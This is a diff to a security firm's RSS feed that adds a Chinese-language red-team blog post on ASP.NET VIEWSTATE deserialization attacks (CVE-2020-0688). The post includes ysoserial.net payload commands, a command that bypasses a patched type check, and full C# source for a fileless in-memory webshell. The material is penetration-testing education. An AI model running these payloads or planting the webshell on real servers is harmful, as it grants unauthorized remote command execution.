@@ -4,11 +4,122 @@
         <title>DEVCORE 戴夫寇爾</title>
         <description>DEVCORE 戴夫寇爾 - 滲透測試服務、資安教育訓練、資安顧問服務</description>
         <link>https://devco.re</link>
-        <lastBuildDate>Wed, 04 Mar 2020 19:15:23 +0800</lastBuildDate>
-        <pubDate>Wed, 04 Mar 2020 19:15:23 +0800</pubDate>
+        <lastBuildDate>Wed, 11 Mar 2020 18:43:14 +0800</lastBuildDate>
+        <pubDate>Wed, 11 Mar 2020 18:43:14 +0800</pubDate>
         <ttl>1800</ttl>
         <atom:link href="https://devco.re/rss" rel="self" type="application/rss+xml" />
 
+
+        <item>
+                <title>玩轉 ASP.NET VIEWSTATE 反序列化攻擊、建立無檔案後門</title>
+                <description>&lt;h2 id=&quot;前言&quot;&gt;前言&lt;/h2&gt;
+
+&lt;p&gt;這篇文章呼應我在研討會 &lt;a href=&quot;https://devco.re/conf/2019/&quot;&gt;DEVCORE Conference 2019&lt;/a&gt; 分享的主題，如何用小缺陷一步步擊破使用 ASP.NET 框架所撰寫的堅固的網站應用程式，其中之一的內容就是關於我們在此之前過往紅隊演練專案中，成功數次透過 VIEWSTATE 的反序列化攻擊並製造進入內網突破口的利用方式以及心得，也就是此篇文章的主題。&lt;/p&gt;
+
+&lt;h2 id=&quot;內文&quot;&gt;內文&lt;/h2&gt;
+
+&lt;p&gt;最近微軟產品 Exchange Server 爆出一個嚴重漏洞 CVE-2020-0688，問題發生的原因是每台 Exchange Server 安裝完後在某個 Component 中都使用了同一把固定的 Machine Key，而相信大家都已經很熟悉取得 Machine Key 之後的利用套路了，可以竄改 ASP.NET Form 中的 VIEWSTATE 參數值以進行反序列化攻擊，從而達成 Remote Code Execution 控制整台主機伺服器。&lt;/p&gt;
+
+&lt;p&gt;更詳細的 CVE-2020-0688 漏洞細節可以參考 ZDI blog：&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.thezdi.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys&quot;&gt;CVE-2020-0688: Remote Code Execution on Microsoft Exchange Server Through Fixed Cryptographic Keys&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;對於 VIEWSTATE exploit 分析在網路上已經有無數篇文章進行深入的探討，所以在此篇文章中將不再重複贅述，而今天主要想聊聊的是關於 VIEWSTATE exploit 在滲透測試中如何進行利用。&lt;/p&gt;
+
+&lt;p&gt;最基本、常見的方式是直接使用工具 &lt;a href=&quot;https://github.com/pwntester/ysoserial.net&quot;&gt;ysoserial.net&lt;/a&gt; 的 ViewState Plugin 產生合法 MAC 與正確的加密內容，TypeConfuseDelegate gadget 經過一連串反射呼叫後預設會 invoke Process.Start 呼叫 cmd.exe，就可以觸發執行任意系統指令。&lt;/p&gt;
+
+&lt;p&gt;例如：&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ysoserial.exe -p ViewState -g TypeConfuseDelegate
+              -c &quot;echo 123 &amp;gt; c:\pwn.txt&quot;
+              --generator=&quot;CA0B0334&quot;
+              --validationalg=&quot;SHA1&quot;
+              --validationkey=&quot;B3B8EA291AEC9D0B2CCA5BCBC2FFCABD3DAE21E5&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;異常的 VIEWSTATE 通常會導致 aspx 頁面回應 500 Internal Server Error，所以我們也無法直接得知指令執行的結果，但既然有了任意執行，要用 PowerShell 回彈 Reverse Shell 或回傳指令結果到外部伺服器上並不是件難事。&lt;/p&gt;
+
+&lt;p&gt;But ..&lt;/p&gt;
+
+&lt;p&gt;在滲透測試的實戰中，事情往往沒這麼美好。現今企業資安意識都相對高，目標伺服器環境出現以下幾種限制都已是常態：&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;封鎖所有主動對外連線&lt;/li&gt;
+  &lt;li&gt;禁止查詢外部 DNS&lt;/li&gt;
+  &lt;li&gt;網頁目錄無法寫入&lt;/li&gt;
+  &lt;li&gt;網頁目錄雖可寫，但存在 Website Defacement 防禦機制，會自動復原檔案&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;所以這時就可以充分利用另一個 ActivitySurrogateSelectorFromFile gadget 的能力，這個 gadget 利用呼叫 Assembly.Load 動態載入 .NET 組件達成 Remote Code Execution，換句話說，可以使我們擁有在與 aspx 頁面同一個 Runtime 環境中執行任意 .NET 語言程式碼的能力，而 .NET 預設都會存在一些指向共有資源的全域靜態變數可以使用，例如 &lt;a href=&quot;https://docs.microsoft.com/zh-tw/dotnet/api/system.web.httpcontext.current?view=netframework-4.8&quot;&gt;System.Web.HttpContext.Current&lt;/a&gt; 就可以取得當下 HTTP 請求上下文的物件，也就像是我們能利用它來執行自己撰寫的 aspx 網頁的感覺，並且過程全是在記憶體中動態處理，於是就等同於建立了無檔案的 WebShell 後門！&lt;/p&gt;
+
+&lt;p&gt;我們只需要修改 -g 的參數成 ActivitySurrogateSelectorFromFile，而 -c 參數放的就不再是系統指令而是想執行的 ExploitClass.cs C# 程式碼檔案，後面用 ; 分號分隔加上所依賴需要引入的 dll。&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ysoserial.exe -p ViewState -g ActivitySurrogateSelectorFromFile
+              -c &quot;ExploitClass.cs;./dlls/System.dll;./dlls/System.Web.dll&quot;
+              --generator=&quot;CA0B0334&quot;
+              --validationalg=&quot;SHA1&quot;
+              --validationkey=&quot;B3B8EA291AEC9D0B2CCA5BCBC2FFCABD3DAE21E5&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;關於需要引入的 dll 可以在安裝了 .NET Framework 的 Windows 主機上找到，像我的環境是在這個路徑 &lt;code class=&quot;highlighter-rouge&quot;&gt;C:\Windows\Microsoft.NET\Framework64\v4.0.30319&lt;/code&gt; 之中。&lt;/p&gt;
+
+&lt;p&gt;至於最關鍵的 ExploitClass.cs 該如何撰寫呢？將來會試著提交給 &lt;a href=&quot;https://github.com/pwntester/ysoserial.net&quot;&gt;ysoserial.net&lt;/a&gt;，就可以在範例檔案裡找到它，或是可以先直接看這裡：&lt;/p&gt;
+
+&lt;div class=&quot;language-csharp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;E&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;E&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Web&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpContext&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Web&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Current&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ClearError&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Clear&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Diagnostics&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Process&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Diagnostics&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;StartInfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FileName&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;cmd.exe&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+            &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Form&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;cmd&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;StartInfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Arguments&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/c &quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;StartInfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RedirectStandardOutput&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;StartInfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RedirectStandardError&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;StartInfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;UseShellExecute&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+            &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;output&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;StandardOutput&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ReadToEnd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Exception&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{}&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Flush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;End&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;其中 &lt;code class=&quot;highlighter-rouge&quot;&gt;Server.ClearError()&lt;/code&gt; 和 &lt;code class=&quot;highlighter-rouge&quot;&gt;Response.End()&lt;/code&gt; 都是必要且重要的一步，因為異常的 VIEWSTATE 必然會使得 aspx 頁面回應 500 或其他非預期的 Server Error，而呼叫第一個函式可以協助清除在當前 Runtime 環境下 stack 中所記錄的錯誤，而呼叫 End() 可以讓 ASP.NET 將當前上下文標記為請求已處理完成並直接將 Response 回應給客戶端，避免程式繼續進入其他 Error Handler 處理導致無法取得指令執行的輸出結果。&lt;/p&gt;
+
+&lt;p&gt;到這個步驟的話，理論上你只要送出請求時固定帶上這個惡意 VIEWSTATE，就可以像操作一般 WebShell 一樣：&lt;br /&gt;
+&lt;img src=&quot;/assets/img/blog/20200311/play-with-viewstate-exploit-and-create-fileless-webshell.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;不過有時也會出現這種情境：&lt;br /&gt;
+&lt;img src=&quot;/assets/img/blog/20200311/cover.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;不論怎麼改 Payload 再重送永遠都是得到 Server Error，於是就開始懷疑自己的人生 Q_Q&lt;/p&gt;
+
+&lt;p&gt;但也別急著灰心，可能只是你遇上的目標有很乖地定期更新了伺服器而已，因為微軟曾為了 ActivitySurrogateSelector 這個 gadget 加上了一些 patch，導致無法直接利用，好在有其他研究者馬上提供了解決方法使得這個 gadget 能再次被利用！&lt;/p&gt;
+
+&lt;p&gt;詳細細節可以閱讀這篇文章：&lt;a href=&quot;https://silentbreaksecurity.com/re-animating-activitysurrogateselector/&quot;&gt;Re-Animating ActivitySurrogateSelector&lt;/a&gt; By &lt;a href=&quot;https://silentbreaksecurity.com/author/nick/&quot;&gt;Nick Landers&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;總而言之，如果遇到上述情形，可以先嘗試用以下指令產生 VIEWSTATE 並發送一次給伺服器，順利的話就能使目標 Runtime 環境下的 DisableActivitySurrogateSelectorTypeCheck 變數值被設為 true，隨後再發送的 ActivitySurrogateSelector gadget 就不會再噴出 500 Server Error 了。&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ysoserial.exe -p ViewState -g ActivitySurrogateDisableTypeCheck
+              -c &quot;ignore&quot;
+              --generator=&quot;CA0B0334&quot;
+              --validationalg=&quot;SHA1&quot;
+              --validationkey=&quot;B3B8EA291AEC9D0B2CCA5BCBC2FFCABD3DAE21E5&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;如果上述一切都很順利、成功執行系統指令並回傳了結果，基本上就足夠做大部分事情，而剩下的就是繼續盡情發揮你的想像力吧！&lt;/p&gt;
+
+&lt;p&gt;不過有時候即便到了此一步驟還是會有不明的錯誤、不明的原因導致 MAC 計算始終是錯誤的，因為 .NET 內部演算法以及需要的環境參數組合稍微複雜，使得工具沒辦法輕易涵蓋所有可能情況，而當遇到這種情形時，我目前選擇的解決方法都是發揮工人智慧，嘗試在本機建立環境、設定相同的 MachineKey、手工撰寫 aspx 檔案，產生包含 gadget 的 VIEWSTATE 再轉送到目標主機上。如果你有更多發現或不一樣的想法願意分享的話，也歡迎來和我交流聊聊天。&lt;/p&gt;
+</description>
+                <link>https://devco.re/blog/2020/03/11/play-with-dotnet-viewstate-exploit-and-create-fileless-webshell/</link>
+                <guid>https://devco.re/blog/2020/03/11/play-with-dotnet-viewstate-exploit-and-create-fileless-webshell</guid>
+                <pubDate>Wed, 11 Mar 2020 00:00:00 +0800</pubDate>
+        </item>
 
         <item>
                 <title>遠距工作的資安注意事項</title>
